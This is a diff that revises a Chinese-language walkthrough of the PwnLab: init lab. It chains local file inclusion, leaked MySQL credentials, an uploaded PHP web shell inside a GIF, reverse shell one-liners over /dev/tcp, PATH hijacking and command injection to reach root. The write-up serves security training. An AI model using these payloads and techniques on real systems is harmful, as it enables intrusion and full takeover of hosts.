@@ -1,8 +1,57 @@
+# 0x0F - PwnLab
 
+## 基本信息
 
-## 信息收集
+- 靶场名称：PwnLab
+- 靶场链接：[VulnHub - PwnLab: init](https://www.vulnhub.com/entry/pwnlab-init,158/)
+- 考点清单：信息收集、LFI、PHP Filter、MySQL 凭据获取、文件上传、反弹 Shell、SUID 提权、PATH 环境变量劫持、命令注入
+- 工具清单：Nmap、Gobuster、DIRB、WhatWeb、Burp Suite、SQLMap、ExifTool、MySQL、SearchSploit、Netcat
 
-主机发现与端口扫描：
+## 攻击链路
+
+```
+Recon
+  │
+  ├── Nmap：发现 80、3306 等端口
+  │
+  ├── Gobuster：发现 index.php、config.php、login.php
+  │
+  ▼
+LFI
+  │
+  ├── ?page=login
+  ├── php://filter 读取 PHP 源码
+  └── 获取 config.php 中的数据库凭据
+  │
+  ▼
+MySQL
+  │
+  ├── 登录数据库
+  ├── 获取 Users.users 中的用户凭据
+  └── Base64 解码得到用户密码
+  │
+  ▼
+File Upload + LFI
+  │
+  ├── kent 账号登录
+  ├── 上传 GIF 图片马
+  ├── 利用 index.php 的 include 包含图片马
+  └── PHP Reverse Shell
+  │
+  ▼
+kent → kane → mike → root
+  │
+  ├── 用户凭据复用：切换 kane
+  ├── PATH Hijacking：kane → mike
+  └── Command Injection：mike → root
+  │
+  ▼
+Root Flag
+```
+
+## 1. 信息收集
+
+### 1.1 主机发现与端口扫描
 
 ```shell
 nmap -sn 192.168.56.1/24 --min-rate 1000
@@ -10,110 +59,230 @@ IP=192.168.56.117
 nmap -A $IP -oN nmap.txt -p `nmap -sS -sU -p- -Pn $IP --min-rate 8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
 ```
 
-![./0x0F - PwnLab/image-20261110170128446](./0x0F - PwnLab/image-20261110170128446.png)
+![Nmap 扫描结果](./0x0F - PwnLab/image-20261110170128446.png)
 
-注意扫描结果中的 3306（MySQL）端口，后面会用到
+**关注 3306 端口**
 
-目录扫描：
+MySQL 服务对外开放，后续可以结合源码泄露获取数据库凭据，尝试直接连接数据库
 
-- `dirb http://192.168.56.117/`
-- `gobuster dir -u "http://192.168.56.117/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip`
+### 1.2 目录扫描
 
-> gobuster, Go 语言编写的快速爆破工具
-> `dir` 子命令进入目录/文件枚举模式（gobuster 还有 `dns`、`vhost`、`fuzz` 等模式）
-> `-x` 对字典中每个单词额外尝试附加这些扩展名。例如字典里有 `backup`，会依次请求 `backup`、`backup.php`、`backup.html`、`backup.zip`
+使用 DIRB、Gobuster 枚举 Web 目录及文件
 
-扫到 `index.php`、`config.php`、`login.php`
+```shell
+dirb http://192.168.56.117/
 
-语言识别：`whatweb http://192.168.56.117` 未标明开发语言，逐一手测：
+gobuster dir \
+-u "http://192.168.56.117/" \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,zip
+```
 
-- `index.html` → Not found
-- `index.jsp` → Not found
-- `index.php` → 回显正常，判定站点为 PHP
+> 其中 Gobuster 使用 `dir` 模式进行目录及文件枚举，`-x` 用于追加指定文件扩展名
+>
+> 例如字典中存在 `backup`，则会额外尝试 `backup.php`、`backup.html`、`backup.zip`
 
-怀疑主页图片 `images/0x0F - PwnLab.png` 做过隐写检查，但实际看来，并无信息：
+发现以下文件：
+
+- `index.php`
+- `config.php`
+- `login.php`
+
+### 1.3 开发语言识别
+
+`whatweb http://192.168.56.117` 未能识别具体开发语言，于是通过手动请求判断
+
+- `index.html`：Not Found
+- `index.jsp`：Not Found
+- `index.php`：正常回显
+
+初步确定目标站点使用 PHP 开发
+
+### 1.4 图片隐写检查
+
+对主页图片进行简单隐写排查，未发现有效信息
 
 ```shell
 wget http://192.168.56.117/images/0x0F - PwnLab.png
+
 exiftool 0x0F - PwnLab.png
+
 strings 0x0F - PwnLab.png
 ```
 
-## 文件包含（LFI）
+## 2. 文件包含与 PHP 源码读取
 
-访问 `/?page=login` 是一个登录框。结合 nmap 扫到的 3306 端口，先尝试 SQL 注入：
+### 2.1 定位文件包含点
 
-- `admin' || '1' like '1`
-- `admin' || 1 like 1 --+`
+访问 `/?page=login`，发现登录页面
 
-手工注入无果，扔 sqlmap：
+结合前面的 MySQL 端口信息，首先尝试对登录功能进行 SQL 注入
 
-1. 把 Burp 的请求包保存到 `req.txt`
-2. 报文主体 `user=123&pass=123&submit=Login` 改为 `user=1*&pass=2*&submit=Login`（`*` 标记注入点）
-3. `sqlmap -r req.txt --batch --level 5`
+```
+admin' || '1' like '1
+admin' || 1 like 1 --+
+```
 
-仍无果
+手工测试无果，进一步使用 SQLMap
 
-观察登录页 URL `?page=login`，结合刚扫到的 `login.php`，猜测 `page` 参数存在文件包含，逐一尝试：
+将 Burp Suite 捕获的登录请求保存为 `req.txt`，修改请求主体，在参数中使用 `*` 标记注入位置
 
-- `?page=config`：能访问，但页面空白无回显
+```
+user=1*&pass=2*&submit=Login
+```
 
-![./0x0F - PwnLab/image-20261110185529950](./0x0F - PwnLab/image-20261110185529950.png)
+执行：
 
-- `?page=config123123`：随便输入一个不存在的文件，仍然空白——无法据此区分文件是否存在
+```
+sqlmap -r req.txt --batch --level 5
+```
 
-![./0x0F - PwnLab/image-20261110185609625](./0x0F - PwnLab/image-20261110185609625.png)
+仍未发现有效注入点
 
-- `?page=../../../../../etc/passwd`：目录穿越，空白无回显，同上
-- `?page=php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd`：PHP 伪协议读绝对路径，空白无回显，同上
-- `?page=php://filter/read=convert.base64-encode/resource=index`：伪协议读相对路径，得到 base64 响应
+重新观察 URL 中的 `?page=login`，结合已经发现的 `login.php`，怀疑 `page` 参数存在文件包含漏洞
 
-![./0x0F - PwnLab/image-20261110185808296](./0x0F - PwnLab/image-20261110185808296.png)
+逐一测试：
 
-如法炮制读取 `upload`、`config`，并通过 `echo ... | base64 -d > xxxx.php` 分别还原出 `index.php`、`config.php`、`upload.php` 源码
+**1. 尝试包含已知文件**
 
-## 数据库凭据
+```
+?page=config
+```
 
-查看 `config.php`，可以看到数据库的账号密码：
+页面空白，没有明显回显
 
-![./0x0F - PwnLab/image-20261110190243518](./0x0F - PwnLab/image-20261110190243518.png)
+![包含 config](./0x0F - PwnLab/image-20261110185529950.png)
 
-结合前面扫到的 3306 端口，直接登录：
+**2. 尝试包含不存在的文件**
 
-```shell
+```
+?page=config123123
+```
+
+仍然空白，无法通过页面回显判断文件是否存在
+
+![包含不存在的文件](./0x0F - PwnLab/image-20261110185609625.png)
+
+**3. 尝试目录穿越**
+
+```
+?page=../../../../../etc/passwd
+```
+
+依然空白且没有回显
+
+**4. 尝试 PHP Filter 伪协议**
+
+```
+?page=php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd
+```
+
+同上
+
+**5. 尝试读取相对路径下的 PHP 源码**
+
+```
+?page=php://filter/read=convert.base64-encode/resource=index
+```
+
+这次获得了 Base64 编码后的响应内容
+
+![PHP Filter 读取源码](./0x0F - PwnLab/image-20261110185808296.png)
+
+### 2.2 批量读取 PHP 源码
+
+利用 PHP Filter 对目标 PHP 文件进行 Base64 编码读取，避免 PHP 文件被直接解析执行
+
+```
+?page=php://filter/read=convert.base64-encode/resource=index
+?page=php://filter/read=convert.base64-encode/resource=config
+?page=php://filter/read=convert.base64-encode/resource=upload
+```
+
+将响应中的 Base64 内容解码，还原 PHP 源码
+
+```
+echo 'BASE64_CONTENT' | base64 -d > index.php
+echo 'BASE64_CONTENT' | base64 -d > config.php
+echo 'BASE64_CONTENT' | base64 -d > upload.php
+```
+
+获得 `index.php`、`config.php`、`upload.php` 三个文件的源码
+
+## 3. 数据库凭据获取
+
+### 3.1 源码审计获取数据库凭据
+
+查看还原后的 `config.php`，发现数据库连接配置中存在明文账号密码
+
+![config.php 数据库凭据](./0x0F - PwnLab/image-20261110190243518.png)
+
+结合 Nmap 发现的 3306 端口，尝试直接连接 MySQL
+
+```
 mysql -uroot -pH4u%QJ_H99 -h 192.168.56.117
 ```
 
-在 `Users.users` 表中得到三条 `username:base64(passwd)` 记录：
+成功连接数据库
 
-![./0x0F - PwnLab/image-20261110172206766](./0x0F - PwnLab/image-20261110172206766.png)
+### 3.2 获取用户凭据
 
-复制到 `pass.list` 中，解码并拆分出用户名字典与密码字典：
+在 `Users.users` 表中发现三条用户记录，密码以 Base64 形式存储
 
-```shell
-# pass.list
-cat pass.list | awk '{print $4}'
-for i in `cat pass.list | awk '{print $4}'`; do (echo $i | base64 -d;print ); done > pass
+![Users.users 用户记录](./0x0F - PwnLab/image-20261110172206766.png)
 
-# user.list
+将查询结果保存到 `pass.list`，分别提取用户名和密码字段
+
+```
+# 提取用户名
 cat pass.list | awk '{print $2}' > user.list
+
+# 提取 Base64 密码并解码
+for i in $(cat pass.list | awk '{print $4}'); do
+    echo "$i" | base64 -d
+    echo
+done > pass
 
 mv pass pass.list
 ```
 
-![./0x0F - PwnLab/image-20261110172417305](./0x0F - PwnLab/image-20261110172417305.png)
+得到用户名字典与密码字典
 
-![./0x0F - PwnLab/image-20261110172458312](./0x0F - PwnLab/image-20261110172458312.png)
+![用户字典](./0x0F - PwnLab/image-20261110172417305.png)
 
-## 文件上传 + 文件包含 Getshell
+![密码字典](./0x0F - PwnLab/image-20261110172458312.png)
 
-回到 `?page=login`，用 kent 的账号密码完成登录，进入 `?page=upload` 文件上传页面
+## 4. 文件上传 + LFI Getshell
 
-审计刚还原的源码，在 `index.php` 处发现 include 文件包含点
+### 4.1 登录并进入上传页面
 
-于是直接上传 GIF 图片马，再利用 `index.php` 进行文件包含：
+回到 `?page=login`，使用前面获取的 kent 用户凭据完成登录，进入 `?page=upload` 文件上传页面
 
-```php
+结合前面还原的源码，审计 `index.php`，发现存在 `include` 文件包含点
+
+由此形成利用链：
+
+```
+文件上传
+   │
+   ▼
+上传 GIF 图片马
+   │
+   ▼
+index.php 文件包含
+   │
+   ▼
+执行图片马中的 PHP 代码
+   │
+   ▼
+命令执行 / 反弹 Shell
+```
+
+### 4.2 构造 GIF 图片马
+
+在图片文件中添加 PHP 代码，构造图片马
+
+```
 GIF89a
 <?php
     system($_GET[0]);
@@ -121,149 +290,346 @@ GIF89a
 ?>
 ```
 
-包含成功：
+其中：
 
-> 一句话木马中把 `system($_GET[0])` 和 `phpinfo()` 写在一起
-> 图片马被包含成功的同时，也就能直接在 phpinfo 页面搜索 `disable_functions` 确认被禁用的函数，省去二次请求
+- `GIF89a`：GIF 文件头，用于满足简单的文件类型检查
+- `system($_GET[0])`：通过 GET 参数接收系统命令并执行
+- `phpinfo()`：输出 PHP 配置信息，用于检查运行环境
 
+上传图片马后，通过 `index.php` 的文件包含点执行其中的 PHP 代码
 
-![./0x0F - PwnLab/image-20261110173110005](./0x0F - PwnLab/image-20261110173110005.png)
+![图片马包含成功](./0x0F - PwnLab/image-20261110173110005.png)
 
-搜索 `disable_functions`，查看限制了哪些函数：
+### 4.3 检查 disable_functions
 
-![./0x0F - PwnLab/image-20261110173330593](./0x0F - PwnLab/image-20261110173330593.png)
+由于图片马同时执行 `phpinfo()`，可以直接在输出页面中搜索 `disable_functions`，查看 PHP 禁用函数列表
 
-反弹 shell 三次尝试：
+![disable_functions](./0x0F - PwnLab/image-20261110173330593.png)
 
-1. 通过 `system($_GET[0])` 传参执行 `sh -i >& /dev/tcp/192.168.56.1/2233 0>&1`，没反应
+### 4.4 反弹 Shell
 
-![./0x0F - PwnLab/image-20261110173555779](./0x0F - PwnLab/image-20261110173555779.png)
+尝试三种方式获取交互式 Shell
 
-2. 把图片马中的 `system($_GET[0])` 改为 `exec("sh -i >& /dev/tcp/192.168.56.1/2233 0>&1")`，重新上传，还是没反应
+**尝试一：通过 system 执行反弹命令**
 
-![./0x0F - PwnLab/image-20261110173838390](./0x0F - PwnLab/image-20261110173838390.png)
+```
+sh -i >& /dev/tcp/192.168.56.1/2233 0>&1
+```
 
-3. 改用复杂的 PHP Reverse Shell 脚本，反弹成功
+无有效回连
 
-![./0x0F - PwnLab/image-20261110174316525](./0x0F - PwnLab/image-20261110174316525.png)
+![第一次反弹 Shell](./0x0F - PwnLab/image-20261110173555779.png)
 
-升级 shell 交互体验：
+**尝试二：修改图片马使用 exec**
 
-```shell
+```
+<?php
+exec("sh -i >& /dev/tcp/192.168.56.1/2233 0>&1");
+?>
+```
+
+重新上传后仍然没有成功
+
+![第二次反弹 Shell](./0x0F - PwnLab/image-20261110173838390.png)
+
+**尝试三：使用完整 PHP Reverse Shell**
+
+改用较完整的 PHP 反弹 Shell 脚本，最终成功建立连接
+
+![PHP Reverse Shell](./0x0F - PwnLab/image-20261110174316525.png)
+
+### 4.5 Shell 交互优化
+
+获得 Shell 后，使用 Python PTY 提升交互体验
+
+```
 which python
 python -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
-# Ctrl+Z
+
+# Ctrl + Z 返回本地终端
 stty raw -echo; fg
 ```
 
-随后就可以 Tab 补全、也可以按 `Ctrl+C` 了
+此时可以使用 Tab 补全、方向键及 `Ctrl+C` 等交互功能
 
-## 提权
+## 5. 提权
 
-### 信息收集
+### 5.1 信息收集
 
-`cat /etc/passwd | grep home`，查看有 home 目录的用户：
+首先查看具有 Home 目录的用户
 
-![./0x0F - PwnLab/image-20261110174726383](./0x0F - PwnLab/image-20261110174726383.png)
+```
+cat /etc/passwd | grep home
+```
 
-`find / -perm -u=s -type f 2>/dev/null`，枚举 SUID 文件：
+![系统用户信息](./0x0F - PwnLab/image-20261110174726383.png)
 
-![./0x0F - PwnLab/image-20261110175725052](./0x0F - PwnLab/image-20261110175725052.png)
+随后枚举 SUID 文件
 
-### exim4 与 procmail（无果）
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
-发现 SUID `exim4`，尝试利用：
+![SUID 文件枚举](./0x0F - PwnLab/image-20261110175725052.png)
 
-1. `/usr/sbin/exim4 --version`
+发现 `exim4` 等具有 SUID 权限的程序
 
-![./0x0F - PwnLab/image-20261110175820673](./0x0F - PwnLab/image-20261110175820673.png)
+### 5.2 exim4 与 procmail 提权尝试
 
-2. `searchsploit exim 4.8`
+首先检查 Exim 版本
 
-![./0x0F - PwnLab/image-20261110175841759](./0x0F - PwnLab/image-20261110175841759.png)
+```
+/usr/sbin/exim4 --version
+```
 
-3. `searchsploit exim -m 39549 44571`
+![Exim 版本信息](./0x0F - PwnLab/image-20261110175820673.png)
 
-中间有一个 py 脚本需要传到靶机执行，用 nc 传文件：
+使用 SearchSploit 搜索相关漏洞
 
-```shell
-# kali
+```
+searchsploit exim 4.8
+```
+
+![Exim 漏洞搜索](./0x0F - PwnLab/image-20261110175841759.png)
+
+尝试下载相关利用脚本
+
+```
+searchsploit exim -m 39549 44571
+```
+
+其中一个 Python 脚本需要传输到靶机执行，使用 Netcat 传输文件
+
+Kali：
+
+```
 nc -lvvp 2233 < 44571.py
+```
 
-# box
+靶机：
+
+```
 cd /tmp
 cat < /dev/tcp/192.168.56.1/2233 > 1.py
 chmod +x 1.py
 python 1.py
 ```
 
-kent 用户下的 SUID 提权（exim、procmail）均无果，转而利用之前获得的 `username:passwd`，尝试切换其他用户：
+kent 用户下针对 Exim、procmail 的 SUID 提权尝试均未成功，暂时放弃该方向
 
-![./0x0F - PwnLab/image-20261110181207613](./0x0F - PwnLab/image-20261110181207613.png)
+### 5.3 利用已获取的用户凭据切换身份
 
-mike 登录不进去，kane 可以
+回顾前面从 MySQL 获取的 `username:passwd`，尝试使用密码切换其他用户
 
-### kane → mike：PATH 环境变量劫持
+![用户切换尝试](./0x0F - PwnLab/image-20261110181207613.png)
 
-在 kane 的家目录下，发现 mike 用户、mike 组的 `msgmike` 可执行文件：
+测试结果：
 
-![./0x0F - PwnLab/image-20261110181410507](./0x0F - PwnLab/image-20261110181410507.png)
+- mike：无法直接登录
+- kane：成功切换
 
-`./msgmike` 尝试执行，报错 `cat: /home/mike/msg.txt: No such file or directory`：
+当前权限从 kent 提升至 kane
 
-![./0x0F - PwnLab/image-20261110181459848](./0x0F - PwnLab/image-20261110181459848.png)
+### 5.4 kane → mike：PATH 环境变量劫持
 
-`strings msgmike` 看一下里面的字符串：
+在 kane 的家目录中，发现一个属于 mike 用户、mike 用户组的可执行文件 `msgmike`
 
-![](./0x0F - PwnLab/image-20261110181638273.png)
+![msgmike 文件](./0x0F - PwnLab/image-20261110181410507.png)
 
-可以看到，它以 system 权限执行 `cat /home/mike/msg.txt`——上述报错就是 `/home/mike/msg.txt` 不存在导致的
+执行程序：
 
-关键在于 `cat` 只是一个相对命令名，不是绝对路径，可以通过环境变量劫持：
-
-```shell
-echo /bin/bash > cat
-chmod +x cat
-export PATH=.:$PATH   # 把当前目录注册到 $PATH 前面
+```
+./msgmike
 ```
 
-劫持 `cat` 后再执行 `msgmike`，成功切换至 mike 用户：
+出现报错：
 
-![./0x0F - PwnLab/image-20261110182033689](./0x0F - PwnLab/image-20261110182033689.png)
+```
+cat: /home/mike/msg.txt: No such file or directory
+```
 
-### mike → root：msg2root 命令注入
+![msgmike 执行结果](./0x0F - PwnLab/image-20261110181459848.png)
 
-在 mike 的家目录下，发现 root 用户、root 组的 `msg2root` 可执行文件：
+使用 `strings` 查看程序中的字符串
 
-![./0x0F - PwnLab/image-20261110182443398](./0x0F - PwnLab/image-20261110182443398.png)
+```
+strings msgmike
+```
 
-`./msg2root` 执行看看情况：让输入一个消息给 root，随便输入提交后就没别的了
+![msgmike strings](./0x0F - PwnLab/image-20261110181638273.png)
 
-![./0x0F - PwnLab/image-20261110182550298](./0x0F - PwnLab/image-20261110182550298.png)
+发现程序内部调用了：
 
-如法炮制，`strings msg2root` 看看执行了什么命令：
+```
+cat /home/mike/msg.txt
+```
 
-![./0x0F - PwnLab/image-20261110182729181](./0x0F - PwnLab/image-20261110182729181.png)
+关键点在于，程序调用的是 `cat`，而不是 `/bin/cat`
 
-它用 system 执行了 `/bin/echo %s >> /root/messages.txt`，`%s` 即我们提交的字符串
+由于 `cat` 使用相对命令名，系统会根据 `$PATH` 环境变量寻找对应的可执行文件
 
-由于 `/bin/echo` 是绝对路径，无法像刚才那样做环境变量劫持
+因此可以在当前目录构造同名程序，劫持原本的 `cat` 命令
 
-但命令是一行拼接执行的——刚才提交 `asdasd` 就相当于执行 `/bin/echo asdasd >> /root/messages.txt`
+**构造恶意 cat**
 
-可以用分号形成命令注入点：`/bin/echo asd;id; >> /root/messages.txt`
+```
+echo /bin/bash > cat
+chmod +x cat
+export PATH=.:$PATH
+```
 
-![./0x0F - PwnLab/image-20261110183047793](./0x0F - PwnLab/image-20261110183047793.png)
+将当前目录 `.` 放在 `$PATH` 最前面，使系统优先执行当前目录下的 `cat`
 
-实际尝试，理论可行：
+重新执行：
 
-![./0x0F - PwnLab/image-20261110183126693](./0x0F - PwnLab/image-20261110183126693.png)
+```
+./msgmike
+```
 
-注入命令拿到 root：
+成功获得 mike 用户权限
 
-![alt](./0x0F - PwnLab/image-20261110183232420.png)
+![PATH 劫持成功](./0x0F - PwnLab/image-20261110182033689.png)
 
-## Flag
+**利用原理**
 
-![./0x0F - PwnLab/image-20261110180728981](./0x0F - PwnLab/image-20261110180728981.png)
+```
+msgmike
+   │
+   ▼
+system("cat /home/mike/msg.txt")
+   │
+   ▼
+PATH 搜索 cat
+   │
+   ▼
+优先匹配当前目录 ./cat
+   │
+   ▼
+执行 /bin/bash
+   │
+   ▼
+获得 mike 权限
+```
+
+### 5.5 mike → root：msg2root 命令注入
+
+在 mike 的家目录下，发现另一个可执行文件 `msg2root`，其所属用户和用户组均为 root
+
+![msg2root 文件](./0x0F - PwnLab/image-20261110182443398.png)
+
+执行程序：
+
+```
+./msg2root
+```
+
+程序要求输入一段消息发送给 root，输入任意内容后程序正常结束
+
+![msg2root 执行结果](./0x0F - PwnLab/image-20261110182550298.png)
+
+使用 `strings` 查看程序中的字符串
+
+```
+strings msg2root
+```
+
+![msg2root strings](./0x0F - PwnLab/image-20261110182729181.png)
+
+发现程序通过 `system()` 执行以下命令：
+
+```
+/bin/echo %s >> /root/messages.txt
+```
+
+其中 `%s` 是用户提交的输入内容
+
+由于 `/bin/echo` 使用绝对路径，无法继续采用前面的 PATH 劫持方式
+
+但程序直接将用户输入拼接到系统命令中，存在命令注入风险
+
+### 5.6 构造命令注入 Payload
+
+正常输入：
+
+```
+asdasd
+```
+
+实际执行的命令相当于：
+
+```
+/bin/echo asdasd >> /root/messages.txt
+```
+
+如果在输入中加入分号，就可以结束原本的 echo 命令，并执行额外命令
+
+例如：
+
+```
+asd;id;
+```
+
+拼接后相当于：
+
+```
+/bin/echo asd;id; >> /root/messages.txt
+```
+
+其中 `id` 会作为独立命令执行
+
+![命令注入测试](./0x0F - PwnLab/image-20261110183047793.png)
+
+实际测试确认命令注入可行
+
+![命令注入验证](./0x0F - PwnLab/image-20261110183126693.png)
+
+进一步利用命令注入执行命令，成功获得 root 权限
+
+![Root Shell](./0x0F - PwnLab/image-20261110183232420.png)
+
+## 6. Flag
+
+成功获取 root 权限，读取最终 Flag
+
+![Root Flag](./0x0F - PwnLab/image-20261110180728981.png)
+
+## 7. 核心考点
+
+| 考点              | 利用位置                       | 核心原理                                   |
+| ----------------- | ------------------------------ | ------------------------------------------ |
+| PHP Filter        | `?page=`                       | 使用 `convert.base64-encode` 读取 PHP 源码 |
+| MySQL 凭据泄露    | `config.php`                   | 源码泄露获取数据库账号密码                 |
+| Base64 解码       | `Users.users`                  | 还原数据库中的用户密码                     |
+| 文件上传 + LFI    | `upload.php`、`index.php`      | 上传图片马后通过文件包含执行 PHP 代码      |
+| PHP Reverse Shell | Web Shell                      | 建立反向连接获取交互式 Shell               |
+| SUID              | `exim4`、`msgmike`、`msg2root` | 利用高权限程序实现权限提升                 |
+| PATH Hijacking    | `msgmike`                      | 劫持相对命令名对应的可执行文件             |
+| Command Injection | `msg2root`                     | 利用 `system()` 拼接用户输入执行任意命令   |
+
+## 8. 复盘
+
+本靶场的主要提权路径并非直接利用系统漏洞，而是围绕程序执行逻辑展开
+
+- **源码审计**：PHP Filter 不仅能够读取系统文件，也可以用于还原 PHP 源码，进一步发现数据库凭据和文件包含逻辑
+- **凭据复用**：数据库中的用户密码为后续横向切换提供了条件
+- **PATH 劫持**：程序使用 `system()` 调用相对命令名时，如果执行环境中的 `$PATH` 可控，就可能执行攻击者构造的同名程序
+- **命令注入**：程序将用户输入直接拼接进 `system()` 命令字符串，且没有进行有效过滤，最终导致 root 权限命令执行
+
+本次提权链路：
+
+```
+kent
+ │
+ │ 已获取的用户凭据
+ ▼
+kane
+ │
+ │ PATH Hijacking
+ ▼
+mike
+ │
+ │ Command Injection
+ ▼
+root
+```
